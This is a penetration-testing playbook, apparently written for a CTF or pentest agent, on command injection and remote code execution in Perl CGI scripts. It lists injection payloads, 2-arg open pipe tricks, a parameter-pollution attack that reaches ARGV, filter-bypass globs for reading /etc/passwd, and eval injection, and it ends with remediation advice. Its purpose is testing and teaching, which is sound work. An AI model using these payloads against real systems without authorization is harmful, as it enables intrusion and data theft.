# Command injection & RCE (Perl/CGI)

Perl's `open`, `system`, backticks, `qx//`, `exec`, and string `eval` all reach a
shell when fed unsanitized input — test every param, especially filenames,
hostnames, dropdown/select values, and "advanced" search fields.

1. **Shell metacharacters**: append `;id`, `|id`, `` `id` ``, `$(id)`, `%0aid`
   (newline), `|id%00`, `&id`, `||id`, `&&id` to a value; look for `uid=`/`gid=`
   in the response. Sweep with `http_fuzz` (marker on the value,
   `match_regex:"uid=\\d+\\("`).
2. **2-arg `open` magic**: a filename-style param controls `open(FH,$file)`
   directly. Try every form: trailing pipe `"id|"`/`"cmd |"` (leading space
   also triggers it), leading pipe `"|id"`, leading `>`/`>>` (write), bare `<`
   (read — same as no prefix). `system($file)`/backticks on the same param are
   equivalent sinks — test both.
3. **CGI param() context confusion → ARGV magic-open (natas31/32 class)**: if
   the script does `my $file = $cgi->param('file'); while (<$file>) {...}`
   after `$cgi->upload('file')`, `param()` in SCALAR context returns only the
   FIRST of several same-named submissions — see `25-cgi-param-pollution.md`
   for the full multipart-body construction via `http_request`. Once armed
   (`$file` becomes the string `"ARGV"`), a query string with NO `=` sign
   feeds `@ARGV`: `POST /script.cgi?|id|` or
   `POST /script.cgi?cat%20/etc/passwd|` triggers the pipe/exec.
4. **Blocklist bypass**: if a keyword filter blocks a literal string (e.g.
   `natas`), split it with empty-string concatenation the shell resolves at
   runtime — `cat /etc/na""tas_webpass/natas30`, `na''tas`; or use a glob the
   filter doesn't string-match — `na?as`, `/???/??t /???/p??s??` for
   `cat /etc/passwd`; combine with `%00` (old perl) to truncate a suffix check.
5. **Time-based blind**: `;sleep 5` / `|sleep 5`, then compare the `timeMs`
   column across the `http_fuzz` rows.
6. **String `eval`**: Perl `eval "$x"` runs Perl — `print 7*7`→`49`,
   `system('id')`. Inject `;system("id");` or `'.system("id").'` per context.
7. **List-form is a dead end**: `system($cmd, @args)` / `exec($cmd, @args)`
   (2+ args, no shell interpolation) never reaches `/bin/sh` — metacharacters
   in `@args` are inert. Only the 1-arg string form (`system("$cmd $arg")`,
   backticks, `qx//`, `open(FH,$x)`) is exploitable; don't waste payloads on a
   confirmed list-form call.
8. Replay a captured POST with the tampered field via `http_request from_flow`.

Evidence: command output (`uid=...`, file contents) or the time delay.
Remediation: never pass user input to `open`/`system`/backticks/`eval`; use
3-arg `open(my $fh,'<',$path)`, list-form `system($cmd,@args)`, force
`scalar($cgi->param($x))` before using a param as a sink argument, and run
under taint mode (`-T`).
